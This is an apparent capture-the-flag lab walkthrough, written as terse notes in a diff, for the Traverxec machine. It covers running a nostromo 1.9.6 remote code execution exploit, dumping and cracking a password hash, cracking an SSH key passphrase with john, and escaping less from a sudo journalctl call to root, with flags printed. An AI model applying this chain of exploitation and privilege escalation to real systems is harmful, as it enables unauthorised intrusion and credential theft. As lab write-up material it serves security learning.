@@ -1,0 +1,100 @@
+web server
+nostromo 1.9.6 
+
+which is vulnerable:
+https://www.exploit-db.com/exploits/47837
+
+
+RCE we have..
+ python rce-nostromo.py 10.10.10.165 80 "uname -a"
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
+
+
+
+
+HTTP/1.1 200 OK
+Date: Thu, 16 Jan 2020 19:47:44 GMT
+Server: nostromo 1.9.6
+Connection: close
+
+
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
+
+
+modify it a bit to get more like a shell and..
+
+rlwrap python .. 
+
+>> cat /var/nostromo/conf/.htpasswd
+HTTP/1.1 200 OK
+Date: Thu, 16 Jan 2020 19:52:39 GMT
+Server: nostromo 1.9.6
+Connection: close
+
+
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+David's hash for da net.
+
+Nowonly4me
+
+
+f621ab7e3a901124807a64c7cc2cd4eb
+
+david has multiple user groups, like video, dip, audio. way to root ?
+
+how to get to david? "Nowonly4me" is not the password for ssh 
+
+from conf file we learn that public_www directory is mapped to /~david
+and from there we find backup ssh keys..
+hexdump -C from RCE or use that cracked hash password and download
+
+we need to crack the privakey passphrase
+
+first ssh2john to change format
+then john --wordlist=/usr/share/wordlists/rockyou.txt privakey
+
+it's hunter. Now ssh
+
+david@traverxec:~$ cat user.txt 
+7db0b48469606a42cec20750d9782f3d
+david@traverxec:~$ ls -altr
+
+since we can do this sudo. It's limited, no way to modify it.
+it will call less. Less can be escaped to shell!! 
+
+
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Thu 2020-01-16 15:30:20 EST, end at Thu 2020-01-16 16:59:26 EST. --
+Jan 16 16:51:55 traverxec crontab[10654]: (www-data) LIST (www-data)
+Jan 16 16:52:04 traverxec sudo[11018]: pam_unix(sudo:auth): authentication failure; 
+Jan 16 16:52:07 traverxec sudo[11018]: pam_unix(sudo:auth): conversation failed
+Jan 16 16:52:07 traverxec sudo[11018]: pam_unix(sudo:auth): auth could not identify 
+Jan 16 16:52:07 traverxec sudo[11018]: www-data : command not allowed ; TTY=pts/3 ; 
+!/bin/sh
+# whoami
+root
+# cat root.txt
+cat: root.txt: No such file or directory
+# cat flag.txt
+cat: flag.txt: No such file or directory
+# ls
+bin  public_www  user.txt
+# cat user.txt
+7db0b48469606a42cec20750d9782f3d
+# cat /root/root.txt
+9aa36a6d76f785dfd320a478f6e0d906
+
